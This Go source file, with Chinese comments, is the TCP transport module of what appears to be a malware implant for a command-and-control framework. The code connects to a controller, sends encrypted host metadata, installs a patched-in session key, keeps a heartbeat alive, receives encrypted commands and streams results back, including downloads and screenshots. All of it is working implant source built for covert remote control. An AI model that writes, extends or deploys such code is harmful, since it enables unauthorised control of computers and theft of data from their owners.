//go:build transport_tcp || transport_multi || !(transport_http || transport_https || transport_kcp || transport_oss || transport_websocket || transport_dns || transport_tcp_forward || transport_kcp_forward || transport_ws_forward || transport_http_forward || transport_https_forward)

package main

import (
	"fmt"
	"implant/core/app"
	"implant/core/debuglog"
	"implant/core/communication"
	"implant/core/encrypt"
	"implant/core/reconnect"
	"implant/core/utils"
	"net"
	"sync"
	"time"
)


// TCPClient 实现 communication.Transport（TCP 持久传输）。
type TCPClient struct {
	Client       *net.TCPConn
	reconnectMgr *reconnect.ReconnectManager
	connectStart time.Time
	connected    bool
	stopCh       chan struct{} // 心跳 goroutine 退出信号
	sendMutex    sync.Mutex   // 串行化所有写路径（心跳/结果/FirstBlood），防帧交错
}

// NewTransport 构造 TCP 传输（单二进制 build tag 入口）
// init 注册到运行时传输表（多传输构建下按 scheme 选择；单传输构建下只有自己）
func init() {
	registerTransport("tcp", newTCPTransport)
	listenerType = "tcp"
}

func newTCPTransport() transportClient {
	return &TCPClient{reconnectMgr: reconnect.NewReconnectManager()}
}

// connected 当前是否已连接
func (s *TCPClient) IsConnected() bool { return s.connected }

// ReconnectMgr 返回重连管理器
func (s *TCPClient) ReconnectMgr() *reconnect.ReconnectManager { return s.reconnectMgr }

func (s *TCPClient) fail() {
	s.connected = false
	// K10: close/nil 纳入发送锁（原与 rawSend 的 s.Client 使用竞态，recover 掩盖 nil panic）
	s.closeClient()
	if s.reconnectMgr != nil {
		s.reconnectMgr.OnReconnectFailed()
	}
}

// closeClient 在发送锁内关闭并置空连接（rawSend 内调用时已持锁，使用 closeClientLocked）
func (s *TCPClient) closeClient() {
	s.sendMutex.Lock()
	defer s.sendMutex.Unlock()
	if s.Client != nil {
		s.Client.Close()
		s.Client = nil
	}
}

// closeClientLocked 调用方已持有 sendMutex 时使用
func (s *TCPClient) closeClientLocked() {
	if s.Client != nil {
		s.Client.Close()
		s.Client = nil
	}
}

// Connect 拨号 + FirstBlood + 会话密钥 + 心跳。
func (s *TCPClient) Connect(host string) error {
	s.connectStart = time.Now()
	if s.reconnectMgr != nil {
		s.reconnectMgr.OnReconnectAttempt()
	}

	addr, err := net.ResolveTCPAddr("tcp", host)
	if err != nil {
		s.fail()
		return err
	}
	conn, err := net.DialTCP("tcp", nil, addr)
	if err != nil {
		s.fail()
		return err
	}
	// TCP keepalive：服务端崩溃/重启（RST/FIN）与黑洞网络下快速发现半开连接，
	// 避免 beacon 读侧永久卡死（默认内核 keepalive 空闲 2h，这里主动收紧）
	conn.SetKeepAlive(true)
	conn.SetKeepAlivePeriod(30 * time.Second)
	s.Client = conn
	s.connected = true

	// MetaInfo + FirstBlood
	if len(utils.MetaInfo) == 0 {
		utils.MetaInfo, _ = utils.EncryptedMetaInfo()
		utils.MetaInfo, _ = encrypt.EncodeBase64(utils.MetaInfo)
	}
	if err := s.rawSend(utils.BytesCombine(utils.WriteInt(1), utils.MetaInfo)); err != nil {
		s.fail()
		return err
	}

	// 会话密钥（占位符由服务端二进制 patch 替换）
	salt, masterKey := app.GetListenerKeyConfig(listenerType)
	if err := encrypt.GlobalClientKeyManager.SetSessionKey(salt[:16], masterKey[:32]); err != nil {
		s.fail()
		return err
	}
	if s.reconnectMgr != nil {
		s.reconnectMgr.OnReconnectSuccess()
	}

	// 心跳：重连时先停旧心跳循环 + 关旧 stopCh，防 goroutine 随重连堆积
	s.StartHeartbeat()

	debuglog.Printf("✅ [TCP] 连接成功，延时: %v\n", time.Since(s.connectStart))
	return nil
}

// StartHeartbeat 启动/重启心跳 goroutine（重连时先停旧的）
func (s *TCPClient) StartHeartbeat() {
	if s.stopCh != nil {
		close(s.stopCh)
	}
	s.stopCh = make(chan struct{})
stop := s.stopCh
	go app.HeartbeatLoop(stop, s.keepAlive)
}

// Recv 读取一条命令：4字节长度 + 载荷 + base64 + 解密，返回已解密数据（cmdType|cmdBuf）。
func (s *TCPClient) Recv() ([]byte, error) {
	if s.Client == nil || !s.connected {
		s.fail()
		return nil, fmt.Errorf("未连接")
	}
	// 读超时：服务端每心跳回复 ack，健康连接不会超时；超时说明服务端半开/死亡，触发重连
	if err := s.Client.SetReadDeadline(time.Now().Add(app.RecvDeadline())); err != nil {
		s.fail()
		return nil, err
	}
	// 【P2-5】共享帧管线：长度前缀 + 上限校验（K3）+ 载荷读取
	total, err := communication.ReadFramedLength(s.Client)
	if err != nil {
		s.fail()
		return nil, err
	}
	if total == 0 {
		return nil, nil
	}
	if total > 1<<20 {
		// 大消息（下载/截图等）：按传输速率放宽读超时，避免慢链路误判超时
		s.Client.SetReadDeadline(time.Now().Add(app.RecvDeadline() + time.Duration(total/50_000)*time.Second))
	}
	payload, err := communication.ReadFramedPayload(s.Client, total)
	if err != nil {
		s.fail()
		return nil, err
	}
	return communication.DecodeFramePayload(payload)
}

// SendResult 按 TCP 协议分帧回送：normalData(2) | MetaLen | MetaInfo | b64Packet，再分块写。
func (s *TCPClient) SendResult(b64Packet []byte) error {
	msgToSend := utils.BytesCombine(utils.WriteInt(2), communication.FrameResult(b64Packet))
	return s.rawSend(msgToSend)
}

// rawSend 前置总长度并分块写入（50KB/块）。全写路径串行化（心跳/结果/FirstBlood 互斥）。
func (s *TCPClient) rawSend(msg []byte) error {
	s.sendMutex.Lock()
	defer s.sendMutex.Unlock()
	defer func() {
		if r := recover(); r != nil {
			debuglog.Printf("[SEND-PANIC] %v\n", r)
		}
	}()
	if s.Client == nil {
		return fmt.Errorf("连接为空")
	}
	msgToSend := utils.BytesCombine(utils.WriteInt(len(msg)), msg)
	// 【P2-5】共享分块写（50KB/块）
	if err := communication.WriteChunked(s.Client, msgToSend); err != nil {
		// K10: 已持发送锁，用 locked 版本避免死锁
		s.connected = false
		s.closeClientLocked()
		if s.reconnectMgr != nil {
			s.reconnectMgr.OnReconnectFailed()
		}
		return err
	}
	return nil
}

func (s *TCPClient) keepAlive() {
	s.rawSend(communication.HeartbeatMsg())
}

func (s *TCPClient) Close() error {
	if s.stopCh != nil {
		close(s.stopCh)
		s.stopCh = nil
	}
	if s.Client != nil {
		return s.Client.Close()
	}
	return nil
}
